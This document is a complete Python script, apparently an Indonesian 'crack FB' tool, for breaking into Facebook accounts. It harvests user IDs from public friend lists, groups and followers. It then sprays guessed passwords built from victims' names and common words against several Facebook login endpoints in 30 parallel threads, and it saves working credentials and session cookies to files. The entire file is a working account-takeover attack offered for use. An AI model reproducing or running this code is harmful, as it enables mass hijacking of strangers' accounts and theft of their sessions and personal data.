#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests,bs4,json,os,sys,random,datetime,time,re

from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred

from bs4 import BeautifulSoup as parser
# UA LIST
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']

#'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]',#'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.86 Mobile Safari/537.36']

# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
#b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
J = '\033[0;33m'
O ='\033[0;33m'
b = '\33[36;1m' #biru keren
m = '\x1b[1;91m' # MERAH
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA YANG 
J = '\033[38;2;255;127;0;1m' # ORANGE
sendy= "[#FF00FF]" # Pink

# Converter Bulan
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# CLEAR
def clear():
	os.system('clear')
# BACK
def back():
	login()
def jalan(kontol):
	for wibu in kontol + "\n":
		sys.stdout.write(wibu)
		sys.stdout.flush()
		time.sleep(0.03)
# BANNER
clear()
banner = f'''{h}┌───────────────────────────────────────────────────────────────────┐
{H}│                                                                   {h}│
│  {x}██████╗██████╗  █████╗  ██████╗██╗  ██╗     ███████╗██████╗      {h}│
{H}│ {x}██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝     ██╔════╝██╔══██╗     {h}│
{H}│{x} ██║     ██████╔╝███████║██║     █████╔╝█████╗{x}█████╗  ██████╔╝     {h}│{x}
{H}│ {x}██║     ██╔══██╗██╔══██║██║     ██╔═██╗╚════╝{x}██╔══╝  ██╔══██╗     {h}│{x}
{H}│ {x}╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗     ██║     ██████╔╝     {h}│
{H}│  {x}╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝     ╚═════╝      {h}│
{h}│                                                {U}Free Script 2.0    {h}│
{H}└───────────────────────────────────────────────────────────────────┘'''


	
	
# VALIDASI TOKEN
def login():
        
		try:
			
			os.system('clear')
			token = open('.token.txt','r').read()		
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
				sy2 = json.loads(sy.text)['name']
				sy3 = json.loads(sy.text)['id']
				
				menu(sy2,sy3)
			except KeyError:
				login_lagi()
			except requests.exceptions.ConnectionError:
				print(banner)
				#banner()
				print('!! Koneksi Error')
				exit()
		except IOError:
			login_lagi()

# LOGIN
def login_lagi():
      
	
	#banner()
	clear()
	print(banner)
	
		
	panda = input(x+'\n['+k+'•'+x+'] Token : ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['id']
		jalan(' \n✓ Login Berhasil > jalankan ulang script')
		
		time.sleep(2)		
		
		exit()
	except KeyError:
		print(' × Login Gagal')
		time.sleep(2)
		login_lagi()
	except requests.exceptions.ConnectionError:
		print('[!] koneksi Bermasalah')
		exit()
# MENU
def menu(my_name,my_id):
	
	try:sh = requests.get('https://httpbin.org/ip').json()
	except:sh = {'origin':'-'}
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:birth = '-'
	print(banner)
	print(x+'\n['+h+'••'+x+'] Nama   : '+str(my_name))
	print(x+'['+h+'••'+x+'] Ip Dev : '+str(sh['origin']))
	print(x+'\n['+h+'01'+x+'] crack Dari Pertemanan publik')
	print(x+'['+h+'02'+x+'] crack dari publik 10 id')
	print(x+'['+h+'03'+x+'] crack dari grup publik')
	print(x+'['+h+'04'+x+'] crack dari followers publik')
	print(x+'['+h+'05'+x+'] cek opsi checkpoint')
	print(x+'['+h+'06'+x+'] cek hasil crack')
	print(x+'['+h+'00'+x+'] keluar hapus token')
	
	jh = input(x+'\n['+h+'••'+x+'] Pilih : ')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:
		dump_massal()
	elif jh in ['3','03']:
		grup()
	elif jh in ['4','04']:
		followers()
	elif jh in ['5','05']:
		file()
	elif jh in ['6','06']:
		result()
	elif jh in ['0','00']:
		os.system('rm -rf .token.txt')
		print(x+'['+h+'•'+x+'] Tunggu ...')
		time.sleep(1)
		jalan('✓ Berhasil Keluar')
		exit()
	else:
		print('[×] Pilihan Tidak Ada Di Menu')
		time.sleep(1.5)
		login()

# RESULT CHECKER
def result():
	
	kayes = ('\n[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu')
	print(kayes)
	kz = input(x+'\n['+h+'•'+x+'] Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('\n[×] Tidak Ditemukan File ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('\n[×] Belum Punya Hasil CP')
			time.sleep(2)
			back()
		else:

			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' --> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
		
			geeh = input(x+'\n['+h+'•'+x+'] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('\n[×] Pilihan Tidak Ada ')
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				print('\n[×] File Tidak Ada')
				time.sleep(2)
				back()
	
			hus = os.system('cd CP && cat '+geh)
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print ('\n[×] File Tidak Ada')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('\n[•] Kamu Belum Punya Hasil')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
		
			geeh = input(x+'\n['+h+'•'+x+'] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('\n[×] Pilihan Tidak Ada')
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				print('\n[×] File Not Found')
				time.sleep(2)
				back()
				
			hus = os.system('cd OK && cat '+geh)
			input(x+'\n['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('[×] Pilihan Tidak Ada')
		exit()

# OPEN
def file():
	print('\n[*] Cek Opsi Dari File ')
	print(x+'\n['+h+'•'+x+'] Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('[?] Pilih File Yg Akan Di Cek')
	my_files = []
	try:
		lis = os.listdir('CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\nYah Kamu Belum Punya Hasil😭')
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' -> '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' --> '+str(len(hem))+' Akun'+x)
		print('\n[•] Pilih File Yang Akan Kamu Cek')
		
		geeh = input(x+'\n['+h+'•'+x+'] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print('\n[×] Pilihan Tidak Ada ')
			
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				print(' * File Tidak Ada')
				time.sleep(2)
				back()

balmond = O+"["+J+"•"+O+"]"
def lah():
	print("\r[*] Total ID : "+str(len(id))+"                     ")
	input("\n[*] Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")
	pass
	setting()
	

def grup():
	id = input("\n[•] ID Atau Username Grup : ")
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://m.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, "html.parser")
	except requests.exceptions.ConnectionError:
		print("[!] Koneksi Internet Terputus..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print("\n[*] Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		exit()
	elif berr2=='Kesalahan':
		jalan("[!] Grup Tidak Ditemukan..")
		time.sleep(0.5)
		exit()
	else:pass
	print("[*] Nama Grup > "+berr2)
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print("[*] Anggota : -")
	else:
		print("[*] Anggota : "+str(ang[0]))
	grup1(url)

def grup1(urls):
	use = []
	ses = requests.Session()
	print("[*] Sedang Mengumpulkan ID")
	print("[*] Tekan CTRL + C Untuk Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\rMengumpulkan ID "+str(len(id))), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://m.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()

saat_ini = datetime.datetime.now()

    

# DUMP ID PUBLIK
def dump_publik():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		jalan(' %s× %sToken Kadaluwarsa'%(h,x))
		exit()
	pil = input(x+'\n['+h+'••'+x+'] Masukkan ID Target : ')
	if pil in ['',' ']:
		print('[%s!!%s] Jangan Kosong'%(h,x))
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'••'+x+'] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('[%s××%s] Koneksi Internet Terputus '%(h,x))
		exit()
	except (KeyError,IOError):
		print('\n[%s××%s] Pertemanan Tidak Publik Atau Token Rusak'%(h,x))
		exit()

# DUMP ID MASSAL
def dump_massal():
	
	print(x+'\n['+h+'••'+x+'] MASUKKAN JUMLAH ID (LIMIT 10)')
	try:
		jum = int(input(x+'['+h+'••'+x+'] BERAPA ID : '))
	except ValueError:
		print('[%s••%s] Masukan Angka 1 - 10'%(h,x))
	if jum<1 or jum>10:
		print('[%s••%s] Maksimal 10 ID'%(h,x))
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(x+'\n['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('[×] Koneksi Internet Terputus')
			
			exit()
	print(f'\n[{h}••{x}] Total ID : %s'%(len(id)))
	setting()

                      
      
def followers():
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        exit()
        

    
    pil = input ('\n[?] Masukkan ID Facebook : ')
    try:
        koh2 = requests.get('https://graph.facebook.com/' + pil + '?fields=subscribers.limit(5000)&access_token=' + tokenku[0]).json()
        for pi in koh2['subscribers']['data']:
            
            try:
                id.append(pi['id'] + '|' + pi['name'])
            except:
                continue

        print('[*] Total : ' + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print('[!] Koneksi Internet Bermasalah') 
        exit()
    except (KeyError, IOError):
        print('[•] Followers Tidak Publik!!')
        exit()            
		
	
		
		
	
      


# PENGATURAN ID
def setting():
	print('\n[%s01%s] Crack Dari Urutan Akun Tua'%(h,x))
	print('[%s02%s] Crack Dari Urutan Akun Muda\n'%(h,x))
	u = input('[%s••%s] Pilih : '%(h,x))
	if u in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif u in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	
	ioz = ('\n[%s01%s] Method B-Api\n[%s02%s] Method Mobile\n[%s03%s] Method Free Facebook'%(h,x,h,x,h,x))
	print(ioz)
	hc = input(x+'\n['+h+'••'+x+'] Pilih : ')
	if hc in ['1','01']:
		method.append('api')
	elif hc in ['2','02']:
		method.append('mobile')
		
	else:
		method.append('free')
		
	passwrd()

# WORDLIST
def passwrd():
	
	krek = f'\n[{h}••{x}] Hasil Ok  Disimpan Ke : OK/%s\n[{h}••{x}] Hasil Cp Disimpan Ke : CP/%s\n'%(okc,cpc);
	print(krek)
	print('[%s••%s] Crack Berjalan Mode Pesawat Jika Tidak Ada Hasil\n'%(h,x))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang','sayangku','bismillah','katasandi','rahasia']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'api' in method:
				pool.submit(crack2,idf,pwv)
			elif 'free' in method:
				pool.submit(crack3,idf,pwv)
		
			else:
				pool.submit(crack,idf,pwv)
	print('')
	print('\n[%s••%s] Crack Selesai'%(h,x))
	woi = input(x+'\n\n['+h+'••'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

# CRACKER
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%sCrack... %s/%s > OK:%s > CP:%s  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\r %s     CP %s • %s'%(M,idf,pw))
				
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			


			elif "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				user = idf
				print('\r %s└──> OK %s • %s                 \n%s '%(h,idf,pw,kuki))
				#cek_apk(kuki)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	loop+=1

				
# CRACKER2
def crack2(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	
	print('\r%s--> %s/%s > OK %s CP %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen).replace('\n','')
	ses = requests.Session()
	for pw in pwv:
		try:
			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
			if "www.facebook.com" in resp.json()["error_msg"]:
				print('\r%s+ %s|%s --> CP'%(k,idf,pw))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1

				break
			elif "session_key" in resp.text and "EAAA" in resp.text:
				print('\r%s+%s|%s --> OK       '%(h,idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#CRACKER3
def crack3(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%sSendy.. %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'free.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://free.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://free.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\r%sCp > %s • %s '%(k,idf,pw))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break

				
			elif "c_user" in ses.cookies.get_dict().keys():
				
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				print('\r%sOk > %s • %s '%(h,idf,pw))
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			
			time.sleep(31)
	loop+=1
		

			

					
					

				
				
					
	
# OPSI
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
